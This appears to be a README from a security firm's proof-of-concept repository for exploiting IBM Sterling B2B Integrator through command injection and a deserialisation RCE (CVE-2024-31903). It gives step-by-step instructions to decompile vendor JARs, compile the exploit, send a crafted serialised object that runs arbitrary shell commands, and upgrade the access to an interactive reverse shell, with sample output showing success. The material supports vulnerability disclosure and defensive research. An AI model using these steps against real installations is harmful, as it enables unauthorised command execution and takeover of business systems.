# IBM Sterling B2B Integrator PoC

Proof of concept code for the exploitation of the vulnerabilities discovered against IBM Sterling B2B Integrator, versions 6.2.0.0 to 6.2.0.2, and 6.0.0.0 to 6.1.2.5 for Linux, Windows and AIX systems:

- LPE Command Injection - if authentication is disabled
- Pre-auth Deserialisation RCE - assigned CVE-2024-31903, see the relevant IBM advisory here: https://www.ibm.com/support/pages/node/7172233 
 
More details about these issues can be found in the accompanying blog post: 
https://labs.withsecure.com/advisories/ibm-b2b-integrator


## Repo Structure

Most of this code in this repo refers to the LPE command injection attack.

The Python binary client `bin_clien.py` can be used to send messages manually to CLA2, allowing exploitation of the deserialisation RCE vulnerability. 


## Usage

```bash
$ java Main
$ Usage: Main <cmdLine> <outfile_or_SEND>
```

The PoC accepts two parameters:
- The shell command to be executed by the target CLA2 client
- A path to write the serialised Java message, or "SEND" to send it immediately to 127.0.0.1:5052, where CLA2 client is listening on


## Instructions 

The source code included in this repository is deliberately incomplete, as certain classes from the CLA2 susbystem are required. Depending on filesystem permissions of the installation directory, you might be able to access the JAR files 

Assuming you have retrieved the relevant files from the JAR decompilation. Will not be uplaoded here as they constitute IBM IP

1. Decompile `CLA2Client.jar` and `CLA2Server.jar` 

2. In the decompiled code, locate files `CmdLine2Result.java` and `CmdLine2Parms.java` 

3. Copy and paste them next to `Main.java` to replicate the directory structure of the original application's java package

```
/src/com/sterlingcommerce/woodstock/services/cmdline2/
```

4. Compile the PoC program - ideally using the JDK packaged by the application 

```bash
${B2BHOME}/INSTALL/jdk/bin/javac src/com/sterlingcommerce/woodstock/services/cmdline2/*.java
```

5.	Execute it - again, using the JDK packaged by the application if possible

```bash
${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main '/bin/sh -c "id > /tmp/withsecureresult"' SEND  
[+] Creating object...  
[+] Sending object...  
[+] ...Sent!  
[+] Receiving header...  
[+] ...header received:  
RESULT  
[+] Receiving result...  
[+] Result received:  
##[DEBUG]## CmdLine2Result:  
fileSize=0  
outputNameLong=null  
outputNameShort=null  
******* end of CmdLine2Result *******  
```

6.	(Optional) To obtain a fully interactive shell, upload the `revshell.py` and `revshell_listener.py` scripts onto the target system, and start the listener. Then, replace the PoC's command parameter with an invocation of the reverse shell script as below:   

```bash 
${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main 'python3 /tmp/revshell.py' SEND
```

